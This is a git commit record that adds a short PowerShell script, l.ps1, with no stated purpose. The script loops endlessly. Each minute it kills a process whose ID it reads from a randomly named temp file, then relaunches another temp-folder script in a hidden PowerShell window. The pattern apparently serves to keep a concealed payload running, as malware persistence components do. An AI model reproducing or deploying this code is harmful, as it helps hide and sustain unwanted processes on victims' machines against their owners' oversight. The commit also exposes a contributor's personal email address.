0ba7af0bf9b4f078adb1cd5c7824ac0353fbbc4b
marshmadnesss <adam.davidsson@icloud.com>
2022-08-05 12:42:43 -0400

    Add files via upload

---
+++ l.ps1
@@ -0,0 +1,14 @@
+for(;;) {
+   try {
+    # invoke the worker script
+    $proc = Get-Content "$env:temp/DdBPKCytRe"
+    Stop-process -id $proc -Force
+    powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/p.ps1"
+   }
+   catch {
+    # do something with $_, log it, more likely
+   }
+   # wait for a minute
+   Start-Sleep 60
+  }
+
